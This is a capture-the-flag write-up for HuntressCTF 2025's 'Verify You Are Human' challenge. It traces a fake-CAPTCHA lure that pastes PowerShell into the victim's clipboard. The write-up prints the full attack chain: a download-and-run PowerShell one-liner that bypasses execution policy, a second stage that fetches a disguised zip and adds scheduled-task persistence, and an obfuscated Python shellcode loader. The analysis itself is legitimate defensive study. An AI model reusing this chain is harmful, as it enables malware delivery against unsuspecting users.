---
title: HuntressCTF 2025 Verify You Are Human
draft: false
tags:
  - ctf
  - deobfuscation
---

# Verify You Are Human

> My computer said I needed to update MS Teams, so that is what I have been trying to do... ...but I can't seem to get past this CAPTCHA!

We are prompted to access a website, which pops up a fake captcha and says "Press Win+R and Win+V to continue". The web app will copy some obfuscated PowerShell to your clipboard and hope you run it that way. The first stage is

```powershell
"C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -Wi HI -nop -c "$UkvqRHtIr=$env:LocalAppData+'\'+(Get-Random -Minimum 5482 -Maximum 86245)+'.PS1';irm 'http://03fb465a.proxy.coursestack.com:443/?tic=1'> $UkvqRHtIr;powershell -Wi HI -ep bypass -f $UkvqRHtIr"
```

So, it's getting the content of `http://03fb465a.proxy.coursestack.com:443/?tic=1'` and invoking that. Moving onto stage2:

```powershell
$JGFDGMKNGD = ([char]46)+([char]112)+([char]121)+([char]99);$HMGDSHGSHSHS = [guid]::NewGuid();$OIEOPTRJGS = $env:LocalAppData;irm 'http://10.1.173.237/?tic=2' -OutFile $OIEOPTRJGS\$HMGDSHGSHSHS.pdf;Add-Type -AssemblyName System.IO.Compression.FileSystem;[System.IO.Compression.ZipFile]::ExtractToDirectory("$OIEOPTRJGS\$HMGDSHGSHSHS.pdf", "$OIEOPTRJGS\$HMGDSHGSHSHS");$PIEVSDDGs = Join-Path $OIEOPTRJGS $HMGDSHGSHSHS;$WQRGSGSD = "$HMGDSHGSHSHS";$RSHSRHSRJSJSGSE = "$PIEVSDDGs\pythonw.exe";$RYGSDFSGSH = "$PIEVSDDGs\cpython-3134.pyc";$ENRYERTRYRNTER = New-ScheduledTaskAction -Execute $RSHSRHSRJSJSGSE -Argument "`"$RYGSDFSGSH`"";$TDRBRTRNREN = (Get-Date).AddSeconds(180);$YRBNETMREMY = New-ScheduledTaskTrigger -Once -At $TDRBRTRNREN;$KRYIYRTEMETN = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Limited;Register-ScheduledTask -TaskName $WQRGSGSD -Action $ENRYERTRYRNTER -Trigger $YRBNETMREMY -Principal $KRYIYRTEMETN -Force;Set-Location $PIEVSDDGs;$WMVCNDYGDHJ = "cpython-3134" + $JGFDGMKNGD; Rename-Item -Path "cpython-3134" -NewName $WMVCNDYGDHJ; iex ('rundll32 shell32.dll,ShellExec_RunDLL "' + $PIEVSDDGs + '\pythonw" "' + $PIEVSDDGs + '\'+ $WMVCNDYGDHJ + '"');Remove-Item $MyInvocation.MyCommand.Path -Force;Set-Clipboard
```

This time, it requests `?tic=2` (stage3 now), downloads the file as a `.pdf`, but then performs zip decompression- so it isn't really a PDF but rather a .zip). We can download this file, `unzip` it, and find an `output.py` file. 

```python
import base64

#nfenru9en9vnebvnerbneubneubn

exec(base64.b64decode("aW1wb3J0IGN0eXBlcwoKZGVmIHhvcl9kZWNyeXB0KGNpcGhlcnRleHRfYnl0ZXMsIGtleV9ieXRlcyk6CiAgICBkZWNyeXB0ZWRfYnl0ZXMgPSBieXRlYXJyYXkoKQogICAga2V5X2xlbmd0aCA9IGxlbihrZXlfYnl0ZXMpCiAgICBmb3IgaSwgYnl0ZSBpbiBlbnVtZXJhdGUoY2lwaGVydGV4dF9ieXRlcyk6CiAgICAgICAgZGVjcnlwdGVkX2J5dGUgPSBieXRlIF4ga2V5X2J5dGVzW2kgJSBrZXlfbGVuZ3RoXQogICAgICAgIGRlY3J5cHRlZF9ieXRlcy5hcHBlbmQoZGVjcnlwdGVkX2J5dGUpCiAgICByZXR1cm4gYnl0ZXMoZGVjcnlwdGVkX2J5dGVzKQoKc2hlbGxjb2RlID0gYnl0ZWFycmF5KHhvcl9kZWNyeXB0KGJhc2U2NC5iNjRkZWNvZGUoJ3pHZGdUNkdIUjl1WEo2ODJrZGFtMUE1VGJ2SlAvQXA4N1Y2SnhJQ3pDOXlnZlgyU1VvSUwvVzVjRVAveGVrSlRqRytaR2dIZVZDM2NsZ3o5eDVYNW1nV0xHTmtnYStpaXhCeVRCa2thMHhicVlzMVRmT1Z6azJidURDakFlc2Rpc1U4ODdwOVVSa09MMHJEdmU2cWU3Z2p5YWI0SDI1ZFBqTytkVllrTnVHOHdXUT09JyksIGJhc2U2NC5iNjRkZWNvZGUoJ21lNkZ6azBIUjl1WFR6enVGVkxPUk0yVitacU1iQT09JykpKQpwdHIgPSBjdHlwZXMud2luZGxsLmtlcm5lbDMyLlZpcnR1YWxBbGxvYyhjdHlwZXMuY19pbnQoMCksIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSksIGN0eXBlcy5jX2ludCgweDMwMDApLCBjdHlwZXMuY19pbnQoMHg0MCkpCmJ1ZiA9IChjdHlwZXMuY19jaGFyICogbGVuKHNoZWxsY29kZSkpLmZyb21fYnVmZmVyKHNoZWxsY29kZSkKY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5SdGxNb3ZlTWVtb3J5KGN0eXBlcy5jX2ludChwdHIpLCBidWYsIGN0eXBlcy5jX2ludChsZW4oc2hlbGxjb2RlKSkpCmZ1bmN0eXBlID0gY3R5cGVzLkNGVU5DVFlQRShjdHlwZXMuY192b2lkX3ApCmZuID0gZnVuY3R5cGUocHRyKQpmbigp").decode('utf-8'))

#g0emgoemboemoetmboemomeio
```

If we code this, we then end up with

```python
import ctypes

def xor_decrypt(ciphertext_bytes, key_bytes):
    decrypted_bytes = bytearray()
    key_length = len(key_bytes)
    for i, byte in enumerate(ciphertext_bytes):
        decrypted_byte = byte ^ key_bytes[i % key_length]
        decrypted_bytes.append(decrypted_byte)
    return bytes(decrypted_bytes)

shellcode = bytearray(xor_decrypt(base64.b64decode('zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ=='), base64.b64decode('me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==')))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))
functype = ctypes.CFUNCTYPE(ctypes.c_void_p)
fn = functype(ptr)
fn()
```

which is basically use `ctypes` to load native Windows shell code (that is base64 encoded). If we use Cyberchef to XOR the `zGdgT6GHR9uXJ682kdam1A5TbvJP/Ap87V6JxICzC9ygfX2SUoIL/W5cEP/xekJTjG+ZGgHeVC3clgz9x5X5mgWLGNkga+iixByTBkka0xbqYs1TfOVzk2buDCjAesdisU887p9URkOL0rDve6qe7gjyab4H25dPjO+dVYkNuG8wWQ==` with the key `me6Fzk0HR9uXTzzuFVLORM2V+ZqMbA==` and write to a file, for example, shellcode.bin, we can then use Binary Ninja to analyze the shellcode.

```
00000000  int64_t sub_0()

00000000  {
00000000      int64_t rbp;
00000000      int64_t var_8 = rbp;
00000001      uint64_t rbp_1 = ((uint64_t)&var_8);
00000003      void var_88;
00000003      uint64_t rsp = ((uint64_t)&var_88);
00000009      *(uint64_t*)(rsp - 8) = -0x7b7b276d;
0000000e      *(uint64_t*)(rsp - 0x10) = -0x68393c70;
00000013      *(uint64_t*)(rsp - 0x18) = -0x6d6c6f3d;
00000018      *(uint64_t*)(rsp - 0x20) = -0x383c3b70;
0000001d      *(uint64_t*)(rsp - 0x28) = -0x6c636c64;
00000022      *(uint64_t*)(rsp - 0x30) = -0x39396340;
00000027      *(uint64_t*)(rsp - 0x38) = -0x6c633969;
0000002c      *(uint64_t*)(rsp - 0x40) = -0x3e62386c;
00000031      *(uint64_t*)(rsp - 0x48) = -0x6e693e22;
00000036      *(uint64_t*)(rsp - 0x50) = -0x3d3b363d;
00000040      uint64_t rdi = ((uint64_t)(rsp - 0x50));
0000004b      int32_t i;
0000004b      do
0000004b      {
00000042          *(uint32_t*)rdi = (*(uint32_t*)rdi ^ 0xa5a5a5a5);
00000048          i = rdi;
00000048          rdi = ((uint64_t)(rdi + 4));
0000004b      } while (i != 0xfffffffc);
0000004e      *(uint8_t*)(rsp - 0x2a) = 0;
00000053      *(uint8_t*)(rbp_1 - 0x81) = 0;
0000005c      uint64_t rdi_1 = ((uint64_t)((int32_t)(rbp_1 - 0x80)));
00000068      do
00000068      {
00000066          *(uint8_t*)rdi_1 = *(uint8_t*)((uint64_t)(rsp - 0x50));
00000068      } while (i != 0xfffffffc);
0000006d      *(uint8_t*)rdi_1 = 0;
0000007c      do
0000007c      {
0000007a          *(uint8_t*)((uint64_t)((int32_t)(rsp - 0x50))) = 1;
0000007c      } while (i != 0xfffffffc);
00000080      *(uint64_t*)rbp_1;
00000081      return 1;
00000000  }
```

This basically creates a buffer that contains `7b7b276d`, `68393c70`, etc and then XORs every 4 bytes with `0xa5a5a5a5`. Creating a simple Python script to reverse this logic: `flag{d341b8d2c96e9cc96965afbf5675fc26}`.`